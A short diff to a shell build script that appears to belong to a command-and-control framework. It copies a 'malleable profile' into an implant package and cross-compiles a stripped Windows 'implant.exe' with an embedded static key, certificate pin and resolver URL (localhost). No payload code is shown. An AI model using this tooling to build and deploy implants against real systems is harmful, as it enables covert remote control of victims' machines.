@@ -24,8 +24,11 @@ fi
 PIN=$(openssl x509 -in server/server.crt -outform DER | sha256sum | cut -d' ' -f1)
 echo "[*] Cert pin: $PIN"
 
+# Copy the malleable profile into the implant package (required by go:embed)
+cp "$PROJECT_DIR/profile.json" "$SCRIPT_DIR/profile.json"
+
 GOOS=windows GOARCH=amd64 go build \
-    -ldflags "-s -w -X main.staticKeyHex=$KEY -X main.certPinHex=$PIN" \
+    -ldflags "-s -w -X main.staticKeyHex=$KEY -X main.certPinHex=$PIN -X main.RESOLVER_URL=https://localhost:8080" \
     -o implant/implant.exe \
     ./implant/
 
